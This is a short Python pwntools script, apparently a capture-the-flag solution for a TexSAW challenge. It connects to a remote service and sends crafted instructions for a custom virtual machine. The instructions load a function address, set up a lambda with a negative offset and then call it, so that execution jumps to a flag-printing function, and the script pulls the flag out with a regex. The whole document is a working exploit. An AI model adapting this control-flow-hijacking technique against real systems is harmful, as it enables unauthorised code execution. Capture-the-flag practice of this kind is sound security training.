from pwn import remote
import re


HOST = "143.198.163.4"
PORT = 1901


FLAG_FUNC = 0x8008570 >> 2
NEG4 = (1 << 64) - 4

ASM = "\n".join(
    [
        "LOAD NULL",
        "LOAD NULL",
        "LOAD NULL",
        "LOAD NULL",
        "LOAD NULL",
        "LOAD NULL",
        "LOAD NULL",
        f"LOAD {FLAG_FUNC}",
        "LOAD 0",
        "VECTOR",
        "LOAD 0",
        f"LAMBDA {NEG4}",
        "LOAD 0",
        "CALL",
        "DONE",
        "",
    ]
)


def main():
    io = remote(HOST, PORT)
    io.send(ASM.encode())
    data = io.recvall(timeout=3)
    match = re.search(rb"texsaw\{[^}]+\}", data)
    if not match:
        raise SystemExit(data.decode("latin1", "replace"))
    print(match.group().decode())


if __name__ == "__main__":
    main()
